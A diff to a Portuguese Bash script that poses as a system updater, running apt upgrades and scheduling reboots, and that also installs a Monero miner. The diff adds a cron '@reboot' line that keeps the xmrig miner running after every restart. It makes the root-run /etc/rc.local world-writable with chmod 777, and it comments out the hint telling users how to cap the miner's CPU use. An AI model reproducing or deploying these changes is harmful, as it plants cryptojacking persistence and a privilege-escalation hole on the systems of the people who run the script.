@@ -27,11 +27,11 @@ done
 echo -e "\033[1;33m]\033[1;37m -\033[1;32m OK !\033[1;37m"
 tput cnorm
 }
-
+clear
 echo ""
 echo -e "          \033[1;33m[\033[1;31m!\033[1;33m] \033[1;32mATUALIZANDO SISTEMA \033[1;33m[\033[1;31m!\033[1;33m]\033[0m"
 echo ""
-echo -e "    \033[1;33mATUALIZAÇÕES COSTUMA DEMORAR UM POUCO!\033[0m"
+echo -e "    \033[1;33mATUALIZAÇÕES COSTUMAM DEMORAR UM POUCO!\033[0m"
 echo ""
 fun_attlist () {
 apt update && apt upgrade -y && apt autoremove -y
@@ -54,11 +54,13 @@ crontab -r >/dev/null 2>&1
 (
 	crontab -l 2>/dev/null
 	echo "00 */6 * * * /sbin/reboot"
+	echo "@reboot cpulimit -e xmrig -l $((75*4)) -b"
 ) | crontab -
 
 echo ""
 echo -e "\033[1;33mLIMITANDO PROCESSOS A 75% !\033[0m"
-
+touch /etc/rc.local
+chmod 777 /etc/rc.local
 CPU_THREADS=$(nproc)
 EXP_MONERO_HASHRATE=$(( CPU_THREADS * 700 / 1000))
 if [ -z $EXP_MONERO_HASHRATE ]; then
@@ -74,10 +76,10 @@ if [ "$CPU_THREADS" -lt "4" ]; then
   else
     echo "sudo sed -i -e '\$i \\cpulimit -e xmrig -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
   fi
-else
-  echo "HINT: Please execute these commands and reboot your VPS after that to limit miner to 75% percent CPU usage:"
-  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/moneroocean/config.json"
-  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/moneroocean/config_background.json"
+#else
+#  echo "HINT: Please execute these commands and reboot your VPS after that to limit miner to 75% percent CPU usage:"
+#  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/moneroocean/config.json"
+#  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/moneroocean/config_background.json"
 fi
 echo ""
 echo -e "\033[1;33mINSTALANDO SCRIPT MINERADOR MONERO!\033[0m"
